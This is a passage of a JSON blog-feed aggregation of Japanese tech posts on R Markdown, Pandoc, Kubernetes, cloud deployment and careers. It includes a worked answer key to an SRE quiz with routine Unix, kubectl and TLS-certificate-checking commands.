Proを使っています。キースィッチがソケット式になっていて、簡単に交換できるのがウリの一つ。このとところキーが重くて入力に失敗することがあるのが気になっていたので、キースィッチオープナーを使ってスプリングを交換してやろうかと考えていました。その場合、DMMあたりでオープナーを買って、遊舎工房あたりでスプリングを買って、作業もそれなりにあってと大仕事。","isoDate":"2020-07-13T00:00:00.000Z","dateMiliSeconds":1594598400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Tokyo.R 86でifもforも使わずにlifegameを実装する話をしてきました","link":"https://blog.atusy.net/2020/06/29/tokyor86-lifegame/","contentSnippet":"「え!? ifもforも使わずにライフゲームの実装を!?」「できらR!!」 というタイトルで話してきました。時間切れになってしまうあたり、準備不足を晒してしまってお恥ずかしい限りでした。もっと伝えたいことがあったのに！","isoDate":"2020-06-29T00:00:00.000Z","dateMiliSeconds":1593388800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"AWS CodeBuild において オンプレのJenkins では成功していたファイル権限系のテストをするとうまくいかない","link":"https://qiita.com/tayakun/items/6b721985bc098dda9846","contentSnippet":"この記事を書くに至った経緯私が開発しているチームでは、Jenkinsでビルド・テストを行っていました。色々と環境をAWSに載せ替えていく中で、AWS CodeBuildを使用することになりました。ところが、ReadOnlyに設定したファイルにWriteできないことをテストすると失敗しているではないか…","isoDate":"2020-06-22T15:15:05.000Z","dateMiliSeconds":1592838905000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"R Markdownでhtml_documentを拡張する時の注意点 (self_contained)","link":"https://blog.atusy.net/2020/06/22/extending-rmarkdown-without-self-contained/","contentSnippet":"rmarkdown::html_documentをrmarkdown::output_formatで拡張する時、引数の指定方法を注意しないと、self_contained引数やkeep_md引数がうまく機能しなくなります（参考: オリジナルなR Markdownの出力形式を作るoutput_format関数事始め）。","isoDate":"2020-06-22T00:00:00.000Z","dateMiliSeconds":1592784000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Mac VScode Maven でJunit 使ってみた","link":"https://qiita.com/tayakun/items/16201aa0371fa874ec78","contentSnippet":"はじめにとりあえずVSCodeでJUnit使ってユニットテスト体験してみたい人が対象です。まだJavaすらMacに入れてないんだ！って人はこちらを参考にしてみてください。動作環境macOS …","isoDate":"2020-06-19T18:23:53.000Z","dateMiliSeconds":1592591033000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Handy Admission Webhook Library","link":"https://qiita.com/toVersus/items/5316e94490d60c220af7","contentSnippet":"Kubernetes の Admission Webhook を開発する際に、kubernetes/api をラップした軽量なライブラリやフレームワークを使うことがあると思います。kubernet…","isoDate":"2020-06-14T05:05:07.000Z","dateMiliSeconds":1592111107000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"R Markdownで出力結果を隠せるようにしてみた (minidownパッケージ)","link":"https://blog.atusy.net/2020/06/14/minidown-with-result-folding/","contentSnippet":"minidownパッケージを使うと以下のような感じのことができるようになります。Resultsの部分をクリックすると図が現れます。plot(iris)Results実例は http://minidown.atusy.net/#results-folding を参照してください。","isoDate":"2020-06-14T00:00:00.000Z","dateMiliSeconds":1592092800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Mac VSCode JavaでHelloWorldした","link":"https://qiita.com/tayakun/items/a38386288c50233c6a90","contentSnippet":"はじめにタイトル通り、ただHelloWorldするだけです。よくある標準出力するだけの課題とかをささっとすますにはいいかもしれません。今からこの環境でWebアプリとか作っちゃうんだ！って人には…","isoDate":"2020-06-10T14:57:49.000Z","dateMiliSeconds":1591801069000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Osaka.Rで昼間のリモートもくもく会を開催しました (2020/6/6)","link":"https://blog.atusy.net/2020/06/08/osakar-mokumoku-20200606/","contentSnippet":"Osaka.Rで昼間のリモートもくもく会を開催しました。これは毎平日の朝に行っているリモートもくもく会のグレードアップ版的な位置付けです。休日開催することで、朝もくより長く時間をとり、進捗を出しつつさらに参加者同士で進捗を可視化しようという試みです。","isoDate":"2020-06-08T00:00:00.000Z","dateMiliSeconds":1591574400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Chaos Mesh によるカオスエンジニアリング","link":"https://medium.com/@yteraoka/chaos-mesh-%E3%81%AB%E3%82%88%E3%82%8B%E3%82%AB%E3%82%AA%E3%82%B9%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%8B%E3%82%A2%E3%83%AA%E3%83%B3%E3%82%B0-46fa2897c742?source=rss-8b55af126a13------2","isoDate":"2020-06-02T03:16:16.000Z","dateMiliSeconds":1591067776000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"knitr::opts_hooksを設定するとチャンクキャッシュが更新されうる","link":"https://blog.atusy.net/2020/06/02/chunk-hooks-may-invalidates-cache/","contentSnippet":"R Markdownのチャンクのキャッシュは、チャンクオプションかコメント以外のコードに変更が加わった場合に更新されます。またR Markdownの背後で動いているknitrパッケージにはフックという概念があり、例えば特定のチャンクオプションがNULL以外の値の場合に発火する関数を仕込むことができます。この場合、関数はチャンクオプションを引数で受け取り、新しいチャンクオプションを返します。","isoDate":"2020-06-02T00:00:00.000Z","dateMiliSeconds":1591056000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Pandoc Lua Filtersのreturnの挙動と複数のフィルタを書くときの用例","link":"https://blog.atusy.net/2020/05/31/lua-filter-returns/","contentSnippet":"PandocのLua Filterでは、Lua Type Referenceに載っている型と同じ名前の関数を作成すると、その型の要素を見つけて順々に関数を適用してくれる。たとえば、Pandoc関数を作成すると、ドキュメント全体のASTを受けとって処理を実行できる。以下は、Luaフィルタを実行していると教えてくれる例。","isoDate":"2020-05-31T00:00:00.000Z","dateMiliSeconds":1590883200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Tokyo.R 85で「R Markdownのオリジナルフォーマットを作ろう」の話をしてきました","link":"https://blog.atusy.net/2020/05/25/tokyor85/","contentSnippet":"毎週月曜日はブログ更新の日！と決めつつ、土曜に発表頑張ったからいいよなあと言う気分に。なので発表しましたとの記録だけ残しておきます。スライドはこちら成果minidownパッケージを不況できた1オリジナルフォーマット作りに興味を持つ人が出てくれた2想定ターゲットとマッチする参加者がいた3肥大化したYAMLフロントマターをなんとかしたい依存ファイルの関係を整理したいLua Filterの有効性を実感頂けた4課題Pandocの処理のお話はまだあまり詳しくR界隈で知られていないように思う。今回のテーマと関連するところでは以下あたり。","isoDate":"2020-05-25T00:00:00.000Z","dateMiliSeconds":1590364800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"GitHub ActionsからGAEにdeployする際のsecretの扱い","link":"https://qiita.com/SatohJohn/items/2341168ccb93c5e144ab","contentSnippet":"概要この記事の内容としては以下の通りGAEのapp.yamlが環境変数を読み取らないので、値をなんとか渡す方法。GitHubActionsで認証ファイルを扱う方法。ユースケースとして、GAE…","isoDate":"2020-05-13T08:20:51.000Z","dateMiliSeconds":1589358051000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"オリジナルなR Markdownの出力形式を作る`output_format`関数事始め","link":"https://blog.atusy.net/2020/05/11/rmd-output-fromat-function/","contentSnippet":"rmarkdown::output_format関数は、新規に、あるいは既存の出力形式を上書きしてオリジナルなR Markdownのの出力形式を作成するための関数です。rmarkdown::render関数を実行する際に、レンダリングに必要な情報をリストで渡します。リストの内容は、自身のbase_format引数を除く引数の名前です。詳しくはドキュメントを参照して頂くか、その内解説する日を待って頂きたいところ。","isoDate":"2020-05-11T00:00:00.000Z","dateMiliSeconds":1589155200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"朝もくを1ヶ月して得た教訓とか #OsakaR","link":"https://blog.atusy.net/2020/05/10/my-way-of-asamoku/","contentSnippet":"1 目標を宣言しよう1.1 朝もくの間に達成できる粒度の目標を作ろう1.2 色々やろう2 進捗は報告しよう3 互いを褒めよう4 別のコミュニティも利用しよう5 アウトプットしよう6 Enjoy!!Osaka.Rの活動としてリモート朝もくを始め1ヶ月ほどが経過しました。良い機会なので、その過程で得た教訓とかをまとめておきたいと思います。必ずしも毎回守れているわけではありませんが、大事にしていきたいので宣言もかねてblog化しました。","isoDate":"2020-05-10T00:00:00.000Z","dateMiliSeconds":1589068800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"html_document(self_contained = FALSE) で出力した時の携帯性をあげるextra_dependencies引数","link":"https://blog.atusy.net/2020/05/03/rmd-extra-dependencies/","contentSnippet":"rmarkdown::html_document関数には、self_contained引数がFALSEな時でも依存しているJavaScriptやCSSをポータブルにするために、extra_dependencies引数が用意されています。本記事ではこの引数の使い方について紹介します。","isoDate":"2020-05-03T00:00:00.000Z","dateMiliSeconds":1588464000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Pandocにself containedさせたくないデータには`data-external=\\"1\\"`を属性付与しよう","link":"https://blog.atusy.net/2020/04/27/pandoc-data-external/","contentSnippet":"self containedなドキュメントでも数式を使うR Markdownの場合Enjoy先日の記事ではR MarkdownでKaTeXをCDNから読み込む際に、Pandocが出力にKaTeXを埋め込まないようにするハックを紹介しました。","isoDate":"2020-04-27T00:00:00.000Z","dateMiliSeconds":1587945600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"R MarkdownでKaTeXを使う","link":"https://blog.atusy.net/2020/04/23/katex-in-html-doc/","contentSnippet":"はじめにアイディア実装プレースホルダの作成KaTeXスクリプトの用意フォーマット関数の用意ベースフォーマットの用意ベースフォーマットを改変する関数の用意レンダリング実用化に向けてEnjoy!はじめに今、Rmdから出力できるHTML5でJavaScript控え目で軽量で高速なHTML文書フォーマットとして、minidown::mini_documentを開発しています。割と実用段階に入ったと思うので、以下のサンプルページを見て見てください。https://minidown-example.atusy.net/","isoDate":"2020-04-23T00:00:00.000Z","dateMiliSeconds":1587600000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Osaka.Rを立ち上げて、リモート朝モクやってます","link":"https://blog.atusy.net/2020/04/21/osakar-asamoku/","contentSnippet":"Osaka.R始めました外出自粛の中でできること = リモート朝もく朝もくの感想個人的なOsaka.Rを立ち上げの背景Osaka.R始めました転職して大阪に引越したのを機にOsaka.Rを始めることにしました。奇しくもOsaka.Rを始めたいと同時期に思っていたくろきちさん、わさびさんと共に立ち上げることにしました。","isoDate":"2020-04-21T00:00:00.000Z","dateMiliSeconds":1587427200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"3月末日で退職してました","link":"https://blog.masasuzu.net/entry/2020/04/12/134300","contentSnippet":"株式会社モバイルファクトリーを3/31で退職してました。2010年6月入社なので9年10ヶ月になりますね。今は新しい会社のSREチームで働いています。前半数年間はケータイ向けのサイト(いわゆる着メロサイト)やソーシャルアプリの開発運用をしていました。後半数年間は社内全体の開発基盤・運用基盤の整備をしていました。いわゆるインフラよりのお仕事ですね。入社当時Webアプリケーション開発をまったく分かってなかったところからなんとか人並みに運用開発できる力をこの会社で身につけることが出来たと思います。今なんとかwebエンジニアをやれてるのはこの会社のおかげと言っても過言では無いと思っています。入社当時SQLをまともに書けなかったくらいのレベルだったのでよく採用されたなと。。。お仕事的には回りのレベルも高いし、自身の仕事のやり方も裁量を与えられていたし、社内環境も、待遇も悪くなかった。むしろ良かったくらいでした。ただ、長年勤めていく内に悪い意味での慣れが出てきて、自分自身停滞感を感じることが出てきました。ここ数年が特に感じることが多く、停滞感から来る焦りを日々感じていました。どうにか停滞感を解消するために副業として他社のお仕事を請け負ったりしていましたが、どうにも解消ができずにいました。そんな折に現職のSREチームの話をいただきました。実際に面談、面接を受けて、課題や環境の話を聞くにつれて、ここでなら一歩進めるのではないかという感触を得ました。もちろん焦燥感、停滞感はあれど、居心地が良いと感じてた今までの環境を変えることにはかなりの葛藤がありました。いろんな決め手はあったのですが、新しい場所の方が一番の下手*1でいれそう、なにより事業的にも業務的にも仲間的にもワクワクできそうというあたりが決定打になりました。入社して2週間しかも、初日以外ずっと在宅勤務なのでまだ様子が摑めてないですが、早くキャッチアップしてバリバリ成果を出していきたい所存です。これからもよろしくお願いします。例のもの置いておきます。気が向いたらでよいです。https://www.amazon.jp/hz/wishlist/ls/3S4C1LCDWKCTM?ref_=wl_share*1:情熱プログラマ参照","isoDate":"2020-04-12T04:43:00.000Z","dateMiliSeconds":1586666580000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"IAPに対応しているGAEにアクセスする","link":"https://qiita.com/SatohJohn/items/d21d8487f55ed911e687","contentSnippet":"概要GCPにあるGAEに対してアクセスする場合、認証のためにIAPをつけることが多いハズその際にrequest clientに対して認証情報を付ける方法についてまとめるサービスアカウントを作るサービスアカウントは以下の通りに作成でき…","isoDate":"2020-03-29T12:12:15.000Z","dateMiliSeconds":1585483935000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Vuetify.jsのリンクの違いについて","link":"https://qiita.com/SatohJohn/items/881d9a6fceceda1c1ce7","contentSnippet":"概要vuetifyのbuttonやlist-itemなどに対してnuxt linkをつける際にリンクの付け方は2つあるhreftoどう使い分けるかというと、 https://qiita.co…","isoDate":"2020-03-22T11:06:18.000Z","dateMiliSeconds":1584875178000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Pandoc lua filter手習い: detailクラス付きのコードブロックを折り畳む","link":"https://blog.atusy.net/2020/03/07/pandoc-lua-detailed-codeblock/","contentSnippet":"実装関数を書くコードブロックをそのまま返すコードブロックを<detals>タグで囲むdetailsクラスを持つコードブロックだけ<details>タグで囲う。detailsクラスを持つコードブロックだけ<details>タグで囲い、summary要素が指定されていれば、<summary>タグに記述するR Markdownで使ってみるRmdファイルデモ: 折り畳み時デモ: 展開時R Markdownのhtml_documentでソースコードだけじゃなくて結果も折り畳みたいようとの声があった。レッスン時にコードの実行結果を受講者に予想させてから見せたい場合を想定しているようだ。そこでknitr::knit_hooksを使う忍術を紹介した。https://github.com/rstudio/rmarkdown/issues/1453#issuecomment-595797200","isoDate":"2020-03-07T00:00:00.000Z","dateMiliSeconds":1583539200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"revealjs_presentationでコードブロックに行番号を付与する","link":"https://blog.atusy.net/2020/03/02/revealjs-linenumbers/","contentSnippet":"code.sourceCode > span { display: inline-block; line-height: 1.25; }code.sourceCode > span { color: inherit; text-decoration: inherit; }code.sourceCode > span:empty { height: 1.2em; }.sourceCode { overflow: visible; }code.sourceCode { white-space: pre; position: relative; }div.sourceCode { margin: 1em 0; }pre.sourceCode { margin: 0; }@media screen {div.sourceCode { overflow: auto; }}@media print {code.sourceCode { white-space: pre-wrap; }code.sourceCode > span { text-indent: -5em; padding-left: 5em; }}pre.numberSource code { counter-reset: source-line 0; }pre.numberSource code > span { position: relative; left: -4em; counter-increment: source-line; }pre.numberSource code > span > a:first-child::before { content: counter(source-line); position: relative; left: -1em; text-align: right; vertical-align: baseline; border: none; display: inline-block; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; padding: 0 4px; width: 4em; color: #aaaaaa; }pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa; padding-left: 4px; }div.sourceCode { }@media screen {code.sourceCode > span > a:first-child::before { text-decoration: underline; }}code span.al { color: #ff0000; font-weight: bold; } /* Alert */code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */code span.at { color: #7d9029; } /* Attribute */code span.bn { color: #40a070; } /* BaseN */code span.bu { } /* BuiltIn */code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */code span.ch { color: #4070a0; } /* Char */code span.cn { color: #880000; } /* Constant */code span.co { color: #60a0b0; font-style: italic; } /* Comment */code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */code span.do { color: #ba2121; font-style: italic; } /* Documentation */code span.dt { color: #902000; } /* DataType */code span.dv { color: #40a070; } /* DecVal */code span.er { color: #ff0000; font-weight: bold; } /* Error */code span.ex { } /* Extension */code span.fl { color: #40a070; } /* Float */code span.fu { color: #06287e; } /* Function */code span.im { } /* Import */code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */code span.kw { color: #007020; font-weight: bold; } /* Keyword */code span.op { color: #666666; } /* Operator */code span.ot { color: #007020; } /* Other */code span.pp { color: #bc7a00; } /* Preprocessor */code span.sc { color: #4070a0; } /* SpecialChar */code span.ss { color: #bb6688; } /* SpecialString */code span.st { color: #4070a0; } /* String */code span.va { color: #19177c; } /* Variable */code span.vs { color: #4070a0; } /* VerbatimString */code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */R Markdownでは、コードブロックにnumberLinesクラスを与えると、Pandocが行番号を付与してくれます。例えば以下のコードブロックをblogdownでレンダリングすると、ちゃんと行番号が付与されます1。","isoDate":"2020-03-02T00:00:00.000Z","dateMiliSeconds":1583107200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ノートブックの最適化はfor文の最適化に通ず","link":"https://blog.atusy.net/2020/02/27/simple-notebook/","contentSnippet":"ループせずに済む処理はforの外に出せループ前要旨パッケージ読み込み関数定義データ読み込み・整形ループ内小規模なデータ整形分析・可視化解釈ループ後データ分析は大きく読み込み・整形分析可視化解釈の4つの要素で成り立つと思う。できればこの順に1サイクルして終わりたいが、現実的には何サイクルも回す。そしてメンテナンス不能で読む気も失せる巨大ノートブックができあがることは、想像に難くない。","isoDate":"2020-02-27T00:00:00.000Z","dateMiliSeconds":1582761600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Merpay SRE Quiz @SRE Next 2020 解答・解説","link":"https://toshikish.hateblo.jp/entry/2020/02/11/024400","contentSnippet":"これは何？2020年1月25日に行われた SRE NEXT 2020 で，メルペイさんがブースで出していた SRE に関するクイズです。正答数で景品がもらえたようです。3問以上：メルペイキーキャップ4問以上：メルペイキーキャップ＋メルペイ SRE が推薦する本今日は SRE NEXT に来ています！ブース出してます！メルペイSREが考えたクイズに挑戦してみてください！#srenext pic.twitter.com/sQmndWucrP— Mercari_Dev (@mercaridevjp) January 25, 2020 メルペイ SRE が推薦する本って？ツイートのスレッドをたどっていくと，ラインナップは以下のようでした。『入門 監視』『詳解 シェルスクリプト』『Kubernetes 完全ガイド』『Programming Kubernetes』『パケットキャプチャの教科書』『プロダクションレディ マイクロサービス』『Linux カーネル Hacks』『エンジニアリング組織論への招待』『エンジニアのためのマネジメントキャリアパス』名著ばかりですね。第1問 SLO とはなんの略でしょうか？選択肢Service Level Observability (サービスレベル可観測性)Service Level Objective (サービスレベル目標)System Level Observability (システムレベル可観測性)System Level Objective (システムレベル目標)正解Service Level Objective (サービスレベル目標)解説SRE 本の Chapter 4 - Service Level Objectives に書かれている定義は以下のとおりです。An SLO is a service level objective: a target value or range of values for a service level that is measured by an SLI.SLI（サービスレベル指標）の目標値または値の範囲を SLO（サービスレベル目標）といいます。第2問 ユーザーが所属しているユーザーグループを知るためのコマンドはどれか？選択肢idwhoamiwholsgroup正解id解説明示されていないですが，UNIX 系 OS のコマンドを前提としていますね。id：ユーザー情報を表示するコマンドで，ユーザー情報（ID，名前）とグループ情報（ID，名前）が表示されます。実行例：foobar@darkstar:~$ iduid=1016(foobar) gid=100(users) groups=100(users)whoami：実行ユーザーの ID を表示するコマンドです。id -un と等価です。who：実行ユーザーの情報（名前，プロセス，起動時刻など）を表示するコマンドです。lsgroup：グループの属性を表示する AIX（IBM の UNIX 系 OS）のコマンドです。デフォルトパラメータがないので，グループを指定するか ALL を指定する必要があります。これらのうち，ユーザーの所属グループが表示されるのは id コマンドです。第3問 $ bash -c \\"echo 3 2 1 | awk \'{print $1}\'\\" の出力結果はどれか？選択肢33 2 1error1正解3 2 1解説bash -c string：string が bash で実行されます。echo message：message と改行を出力します。パイプ |：コマンドの出力を次のコマンドの標準入力に渡します。ここでは，3 2 1\\\\n を awk コマンドの標準入力に渡します。awk \'パターン {アクション}\'：AWK のコマンドで，入力に対してパターンにマッチしたものにアクションを適用します。パターンを省略（空パターン）すると，全パターンにマッチする扱いになります。$ bash -c \\"... $1 ...\\"：\\"\\" で囲まれた$ は展開されます。1 という変数名は定義されていないので，$1 が展開されると空文字になります。AWK に伝わるスクリプトは \'{print }\' になり，全パターンに対してそのまま出力する挙動になります。したがって，$ bash -c \\"echo 3 2 1 | awk \'{print $1}\'\\"3 2 1となります。ちなみに，1番目のフィールドを表示させたい場合は，$ が展開されないように \\\\$ とエスケープします。$ bash -c \\"echo 3 2 1 | awk \'{print \\\\$1}\'\\"3bash -c \\"...\\" を噛まさなければ，シングルクォート \'\' で囲まれた $ が展開されず，意図通りの挙動になります。$ echo 3 2 1 | awk \'{print $1}\'3エスケープ・展開絡みの落とし穴を題材にした問題ですね。調べてみたら複数事例見つかり，ハマりポイントのようです。stackoverflow.comteratail.com第4問 DNS が使用するポート番号は何番ですか？選択肢225380443正解53解説すべて well-known ポート番号です。22：SSH53：DNS80：HTTP443：HTTPS第5問 Kubernetes の Deployment の Event を見られるコマンドは，以下のうちどれか？選択肢kubectl describe <Deployment Name>kubectl logs -l <Deployment Label>kubectl get deployment <Deployment Name> -o yamlkubectl logs <Deployment Name>正解kubectl describe <Deployment Name>解説kubectl describe：リソースの詳細な情報を出力します。Events: セクションにイベント情報が表示されます。kubectl get events コマンドで全リソースのイベントを表示することができます。kubectl logs：コンテナのログを出力します。--selector (-l) オプションで結果にフィルタをかけることができます。kubectl get：リソースの基本的な情報を取得します。kubectl get deployment <Deployment Name> -o yaml とすると，Deployment の定義を YAML 形式で出力します。kubectl describe コマンドの引数で Deployment の名称を指定すると，その Deployment に関連したイベントを取得できるので，kubectl describe <Deployment Name> が正解です。第6問 Web サイトに設定している TLS 証明書の有効期限を確認できるコマンドは以下のうちどれか？選択肢openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text | grep Aftercurl --tlsv1.2 -l https://www.merpay.com | grep Expirewget --no-check-certificate https://www.merpay.com | grep Certnmap --script ssl-enum-ciphers -p 443 www.merpay.com | grep Date正解openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text | grep After解説openssl s_client -connect www.merpay.com:443 | openssl x509 -noout -text：OpenSSL の SSL/TLS クライアントで指定されたホストに接続して証明書を取得し，x509 サブコマンドで証明書情報を取り出します。Not After : で始まる行に有効期限が書かれるので，grep で取り出せます。-text オプションの代わりに -dates オプションを指定すると，証明書の開始日と失効日だけが出力されます。curl --tlsv1.2 -l https://www.merpay.com：Response Body（ここでは HTML）が出力されます。TLS 証明書の情報は含まれません。wget --no-check-certificate https://www.merpay.com：指定した URL の内容を証明書の検証をせずにダウンロードしてファイル（ここでは index.html）に保存します。標準出力にはリクエストの実行ログが吐かれますが，TLS 証明書の情報は含まれません。nmap --script ssl-enum-ciphers -p 443 www.merpay.com：Nmap を用い，指定されたホストに対して SSL/TLS の暗号・圧縮方式を複数試行した結果を出力します。証明書の有効期限の情報は含まれません。実行例：PORT    STATE SERVICE REASON443/tcp open  https   syn-ack| ssl-enum-ciphers:|   TLSv1.0:|     ciphers:|       TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A|       TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C|       TLS_ECDHE_ECDSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_RSA_WITH_RC4_128_SHA (rsa 2048) - C|       TLS_RSA_WITH_RC4_128_MD5 (rsa 2048) - C|     compressors:|       NULL|     cipher preference: server|     warnings:|       64-bit block cipher 3DES vulnerable to SWEET32 attack|       Broken cipher RC4 is deprecated by RFC 7465|       Ciphersuite uses MD5 for message integrity|       Weak certificate signature: SHA1|   TLSv1.2:|     ciphers:|       TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A|       TLS_RSA_WITH_AES_128_GCM_SHA256 (rsa 2048) - A|       TLS_RSA_WITH_AES_256_GCM_SHA384 (rsa 2048) - A|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A|       TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C|       TLS_ECDHE_ECDSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_ECDHE_RSA_WITH_RC4_128_SHA (secp256r1) - C|       TLS_RSA_WITH_RC4_128_SHA (rsa 2048) - C|       TLS_RSA_WITH_RC4_128_MD5 (rsa 2048) - C|     compressors:|       NULL|     cipher preference: server|     warnings:|       64-bit block cipher 3DES vulnerable to SWEET32 attack|       Broken cipher RC4 is deprecated by RFC 7465|       Ciphersuite uses MD5 for message integrity|_  least strength: CcURL，Nmap で実現する例は以下のとおりです。curl --tlsv1.2 -v https://www.merpay.com 2>&1 | grep expirenmap --script ssl-cert -p 443 www.merpay.com | grep afterserverfault.com感想骨のある問題が多いです。1，4を確実に正解して，その他をどれだけ正解できるかといった感じでしょうか。知らなければ調べればいい話ですが，業務でよく使うコマンドなら覚えておいて手足のように使いこなせるほうが望ましいでしょう。","isoDate":"2020-02-10T17:44:00.000Z","dateMiliSeconds":1581356640000,"authorName":"toshikish","authorId":"toshikish"},{"title":"2019年のふりかえり、2020年の目標","link":"https://kyohmizu.hatenablog.com/entry/2020/02/01/040351","contentSnippet":"すでに年が明けて1ヶ月経ちましたが、2019年の活動を振り返ろうと思います。Kubernetes、Cloud Native技術を中心に学習を進めました。勉強会、カンファレンス1月Cloud Native Meetup Tokyo #6 KubeCon + CNCon RecapKubernetes Meetup Tokyo #15 - KubeCon 2018 RecapRancher/Kubernetes勉強会　Kubernetes管理ツールの活用法OWASP Connect in Tokyo #2今回は特別編！Cloud Nativeなアプリ開発から学んだことを全部シェア - cndjp#92月Yahoo! JAPAN MEETUP #31 インフラ技術カンファレンスGo 1.12 Release Party in Tokyo w/ Fukuoka&Umedassmjp 2019/02Docker Meetup Tokyo #28第三回ボトムアップドメイン駆動設計サイバーセキュリティシンポジウム3月k8s source code reading #3Cloud Native Meetup Tokyo #7 @Abema Towers4月Cloud Native Tokyo #01Serverlessについて思いを馳せる一夜 - cndjp第11回勉強会ssmjp 2019/04Rancher k3s もくもく勉強会 #035月レガシーをぶっつぶせ。現場でDDD！ssmjp 2019/05IIJ Technical NIGHT vol.7SRE Lounge #9Docker Meetup Tokyo #30 (DockerCon・KubeConEU報告会)Yahoo! JAPAN MEETUP #32 インフラ技術／Kubernetes6月NoOps Meetup Tokyo #6Kubernetes Meetup Tokyo #20 - KubeCon RecapGCPUG Tokyo Next Extended 2019 Infra DayInteract 20197月恐るることなかれ! Cloud NativeリレーショナルDB特集!! - cndjp第12回第三十五回 Azureもくもく会 @ 品川CloudNative Days Tokyo Meetup w/ Melanie CebulaKubernetes Meetup Tokyo #21 - Cloud Native CI/CDSekkeiKaigiCloud Native Days Tokyo 2019 → スタッフとして参加8月SRE Lounge #10CloudNative Days Tokyo 2019振り返りNightGo 1.13 Release Party in TokyoKubernetes Meetup Tokyo #229月Docker Meetup Tokyo #32Japan Azure User Group 9周年イベントXP祭り2019golang.tokyo #26Cloud Native Meetup Tokyo #10Kubernetes Meetup Tokyo #23 - Operator Deep Dive10月Terraform meetup tokyo#2Kubernetes Meetup Tokyo #24SRE Lounge #1111月さくらの夕べDocker/Kubernetesナイト #2Go Release 10 Year Anniversary Party in Tokyoゴリラ.vim #10 非公式VimConf後夜祭 girls.vimと合同開催技術書典8 はじめてのサークル参加meetupMicrosoft Open Tech Night #1 - インフラ編+Ignite速報俺たちの最適なCloud Nativeを求めて…。本気のこと始め！ - cndjp第13回12月Japan Rook Meetup #1Cloud Native Meetup Tokyo #11 KubeCon RecapGDG DevFest Tokyo 2019Microsoft Open Tech Night #3 - クラウドネイティブ編登壇資料speakerdeck.comspeakerdeck.comspeakerdeck.com書籍商業誌Kubernetes完全ガイドしくみがわかるKubernetesみんなのDocker/KubernetesKubernetes実践入門情報処理安全確保支援士 教科書みんなのGo言語インフラエンジニアの教科書Linuxのしくみ分散システムデザインパターン入門監視Linux教科書 LPICレベル1Docker実践ガイドKubernetes実践ガイド同人誌ふりかえり読本 場作り編ふりかえり読本 学び編ふりかえり読本 実践編理論と事例でわかる自己肯定感理論と事例でわかるモチベーション現場の「ズレ」を解消するコミュニケーションメソッド 第2版会話の引き出しを増やす 1on1カード と 